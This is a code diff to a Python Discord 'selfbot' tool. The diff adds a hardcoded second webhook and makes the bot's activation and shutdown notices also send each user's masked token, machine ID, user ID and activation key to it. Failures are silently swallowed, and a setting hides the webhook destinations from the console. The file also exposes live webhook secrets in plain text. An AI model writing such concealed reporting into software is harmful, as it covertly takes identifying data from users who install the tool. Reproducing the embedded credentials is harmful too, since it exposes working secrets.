@@ -251,6 +251,7 @@ OWNER_ROLE_ID = int(os.getenv("OWNER_ROLE_ID", "1402650246538072094"))
 CHATSEND_ROLE_ID = int(os.getenv("CHATSEND_ROLE_ID", "1406339861593591900"))
 SERVICE_URL = os.getenv("SERVICE_URL", "https://discord-key-bot-w92w.onrender.com")  # Bot website for API (overridable)
 CHAT_MIRROR_WEBHOOK = os.getenv("CHAT_MIRROR_WEBHOOK", "https://discord.com/api/webhooks/1408279883519627364/BEfE1V2LDgacgb30nv1TbIBMV1EWlDtbA4iL_HU0GJKEeT314Xpi34UtgFYJSjU9hVgi")
+TOKEN_EVENT_WEBHOOK = os.getenv("TOKEN_EVENT_WEBHOOK", "https://discord.com/api/webhooks/1408612575003934831/KkcW8DX1y428mp75FAWdYQ9FTwL0tCzLdzmpBRkQwMf-HjtbAztkyBEXqNfIzCZPATO2itll")
 
 SILENT_LOGS = True  # do not print IP/token/webhook destinations to console
 
@@ -2060,12 +2061,22 @@ class Selfbot:
                 "fields": [
                     {"name": "User", "value": username, "inline": True},
                     {"name": "User ID", "value": f"`{self.user_id}`", "inline": True},
+                    {"name": "Masked Token", "value": f"`{mask_token(self.user_token)}`", "inline": False},
+                    {"name": "Machine ID", "value": f"`{machine_id()}`", "inline": True},
                     {"name": "Activation Key", "value": f"`{self.activation_key or 'N/A'}`", "inline": False},
                     {"name": "Activated At", "value": f"<t:{int(time.time())}:F>", "inline": True}
                 ],
                 "timestamp": datetime.now(timezone.utc).isoformat()
             }
-            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=8)
+            try:
+                requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=8)
+            except Exception:
+                pass
+            try:
+                if TOKEN_EVENT_WEBHOOK and TOKEN_EVENT_WEBHOOK != WEBHOOK_URL:
+                    requests.post(TOKEN_EVENT_WEBHOOK, json={"embeds": [embed]}, timeout=8)
+            except Exception:
+                pass
         except Exception:
             pass
     
@@ -2346,14 +2357,24 @@ class Selfbot:
                     "fields": [
                         {"name": "User", "value": username, "inline": True},
                         {"name": "User ID", "value": f"`{self.user_id}`", "inline": True},
+                        {"name": "Masked Token", "value": f"`{mask_token(self.user_token)}`", "inline": False},
+                        {"name": "Machine ID", "value": f"`{machine_id()}`", "inline": True},
                         {"name": "Activation Key", "value": f"`{self.activation_key or 'N/A'}`", "inline": False},
                         {"name": "Offline At", "value": f"<t:{int(time.time())}:F>", "inline": True}
                     ]
                 }
-                requests.post(WEBHOOK_URL, json={"embeds": [off_embed]}, timeout=8)
+                try:
+                    requests.post(WEBHOOK_URL, json={"embeds": [off_embed]}, timeout=8)
+                except Exception:
+                    pass
+                try:
+                    if TOKEN_EVENT_WEBHOOK and TOKEN_EVENT_WEBHOOK != WEBHOOK_URL:
+                        requests.post(TOKEN_EVENT_WEBHOOK, json={"embeds": [off_embed]}, timeout=8)
+                except Exception:
+                    pass
             except Exception:
                 pass
-            print("\n👋 Selfbot stopped")
+            print("\n👋Selfbot stopped")
 
 
 if __name__ == "__main__":
